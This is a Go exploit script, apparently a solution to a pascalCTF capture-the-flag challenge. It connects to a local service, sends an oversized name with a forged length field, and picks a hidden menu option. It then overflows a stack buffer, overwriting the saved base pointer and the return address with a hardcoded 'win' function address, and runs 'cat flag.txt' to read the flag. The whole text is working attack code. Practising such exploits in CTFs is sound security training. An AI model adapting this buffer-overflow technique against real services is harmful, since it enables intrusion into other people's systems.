func main() {
	conn, err := net.Dial("tcp", "127.0.0.1:1338")
	checkErr(err)
	defer conn.Close()

	var input bytes.Buffer

	_ = readAll(conn, "To continue insert your name .* :")

	name := strings.Repeat("a", 76)
	nameBufferLen := uint32(76 + 4 + 8 + 8) // sizeof(name) + sizeof(nameBufferLen) + sizeof(padding) + sizeof(winPointer)
	input.WriteString(name)
	_ = binary.Write(&input, binary.LittleEndian, nameBufferLen)
	input.WriteString(" ")
	write(conn, &input)

	_ = readAll(conn, "Market menu:")

	input.WriteString("69\n")
	write(conn, &input)

	_ = readAll(conn, `I forgot it`)

	padding := uint64(0)                     // saved RBP
	winPointer := uint64(0x0000000000402F65) // return address

	input.WriteString(name)
	_ = binary.Write(&input, binary.LittleEndian, nameBufferLen)
	_ = binary.Write(&input, binary.LittleEndian, padding)
	_ = binary.Write(&input, binary.LittleEndian, winPointer)
	input.WriteString("\n")
	write(conn, &input)

	_ = readAll(conn, "")

	input.WriteString("cat flag.txt\n")
	write(conn, &input)

	_ = readAll(conn, "pascalCTF{.*}")
}
